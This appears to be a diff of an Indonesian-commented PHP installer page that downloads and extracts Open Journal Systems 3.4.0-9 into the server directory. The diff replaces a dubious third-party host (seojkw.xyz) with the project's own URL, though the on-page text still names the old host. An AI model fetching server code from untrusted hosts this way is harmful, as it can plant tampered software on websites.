@@ -1,6 +1,6 @@
 <?php
 // ============================================================
-//  DOWNLOAD & EKSTRAK ojs-3.4.0-9.zip via PHP
+//  DOWNLOAD & EKSTRAK ojs-3.4.0-9.tar.gz via PHP
 //  Menggunakan file_get_contents + PharData (tanpa shell)
 // ============================================================
 set_time_limit(0);
@@ -10,8 +10,8 @@ $message = '';
 $targetDir = __DIR__; // direktori skrip ini
 
 // URL file .tar.gz (sesuai permintaan)
-$url = 'https://seojkw.xyz/ojs-3.4.0-9.zip';
-$tarName = 'ojs-3.4.0-9.zip';
+$url = 'https://pkp.sfu.ca/ojs/download/ojs-3.4.0-9.tar.gz';
+$tarName = 'ojs-3.4.0-9.tar.gz';
 $tarPath = $targetDir . '/' . $tarName;
 $extractTo = $targetDir . '/ojs-3.4.0-9'; // folder tujuan
 
@@ -71,7 +71,7 @@ if (isset($_POST['download'])) {
 <h2>📥 Download & Install OJS 3.4.0-9</h2>
 <?php if ($message) echo '<div style="background:#dff0d8;padding:15px;border-radius:5px;margin-bottom:20px;">'.$message.'</div>'; ?>
 <form method="post">
-    <p>Klik tombol di bawah untuk mendownload <strong>ojs-3.4.0-9.zip</strong> dari seojkw.xyz dan mengekstrak ke folder <strong>ojs-3.4.0-9</strong> di direktori saat ini.</p>
+    <p>Klik tombol di bawah untuk mendownload <strong>ojs-3.4.0-9.tar.gz</strong> dari seojkw.xyz dan mengekstrak ke folder <strong>ojs-3.4.0-9</strong> di direktori saat ini.</p>
     <input type="checkbox" name="delete_tar" id="del" checked> <label for="del">Hapus file .tar.gz setelah ekstrak</label><br><br>
     <input type="submit" name="download" value="Download & Ekstrak" style="background:#27ae60;color:#fff;padding:12px 30px;border:none;border-radius:5px;font-size:16px;cursor:pointer;">
 </form>
